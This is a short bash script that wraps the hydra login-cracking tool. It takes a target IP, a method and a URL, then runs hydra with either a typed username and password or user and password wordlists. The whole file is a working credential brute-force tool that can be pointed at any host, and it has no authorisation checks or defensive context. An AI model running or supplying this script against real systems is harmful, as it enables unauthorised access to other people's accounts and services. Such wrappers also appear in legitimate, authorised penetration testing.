#!/bin/bash

clear
echo "Usage:
./run.sh ip-addr method url
"

if [ "$1" == "" ] || [ "$2" == "" ] || [ "$3" == "" ]
then
	echo -e "\e[31m Arguments not passede\e[0m"
	echo -e "\e[31musage: /run.sh ip-addr method url\e[0m"
	echo ""
	exit 
fi


read -p "do you know the credentials: y/n" ans

if [ "$ans" == "y" ]
then
	read -p "enter username: " username
	read -p "enter password: " password
	echo -e "\e[31mstarting bruteforce...\e[0m"
	hydra -l "$username" -p "$password" "$1" "$2" "$3" -V -I
elif [ "$ans" == "n" ]
then
	read -p "enter user list: " userlist
	read -p "enter pass list: " passlist
	echo -e "\e[31m starting bruteforce\e[0m"
	hydra -L "$userlist" -P "$passlist" "$1" "$2" "$3" -V -I
else
	echo -e "\e[32mInvalid argument\e[0m"
	exit
fi
